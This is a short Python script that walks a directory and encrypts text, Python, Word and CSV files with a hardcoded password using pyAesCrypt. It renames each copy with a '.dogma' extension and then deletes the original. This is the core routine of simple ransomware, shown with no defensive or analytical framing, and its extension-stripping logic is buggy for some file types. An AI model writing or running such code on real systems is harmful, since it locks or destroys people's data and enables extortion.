import os
import pyAesCrypt

bufferSize = 64 * 1024
password = "12345"

for root, dirs, files in os.walk("path"):
    for file in files:
        if file.endswith((".txt", ".py", ".docx", ".csv")): # The arg can be a tuple of suffixes to look for
            unique_file = os.path.join(file)
            unique_path = os.path.join(root + "/")
            format_file = unique_file[:-4]
            print(root + format_file)
            pyAesCrypt.encryptFile(unique_path + unique_file, unique_path + format_file + ".dogma",
                                   password,
                                   bufferSize)
            os.remove(unique_path + unique_file)
